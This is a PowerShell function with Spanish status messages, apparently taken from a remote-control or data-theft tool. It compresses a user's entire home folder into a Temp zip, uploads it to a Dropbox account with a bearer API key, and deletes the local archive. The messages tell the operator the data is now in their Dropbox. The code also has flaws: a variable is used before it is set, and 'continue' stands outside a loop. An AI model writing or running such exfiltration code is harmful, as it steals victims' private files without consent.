function Download{
  param([String]$Path)
  
  if(-not (Test-Path -Path $Path)){
    return
  }
  
  $size = (Get-Item $Path | Measure-Object -Property Length -Sum).Sum /1MB
  
  if($size -lt 50){
    Send-Document -File $Out
  } else {
    $Out = "$env:LOCALAPPDATA\Temp\Home.zip"
    Compress-Archive -CompressionLevel Optimal -Path $env:HOMEPATH -DestinationPath $Out
    if(!$?){
      continue
    }
  
    $size = (Get-Item $Out | Measure-Object -Property Length -Sum).Sum /1MB
    $arg = '{ "path": "/home.zip", "mode": "add", "autorename": true, "mute": false }'
    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $headers.Add("Authorization", "Bearer $APIKey")
    $headers.Add("Dropbox-API-Arg", $arg)
    $headers.Add("Content-Type", 'application/octet-stream')

    $response = Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $Out -Headers $headers

    if($response.is_downloadable){
      $global:execute = "Los datos están disponibles en tu Dropbox"
    }else{
      $global:execute = "Algo ha ocurrido cuando se subia el fichero"
    }
  Remove-Item $Out
  }
}
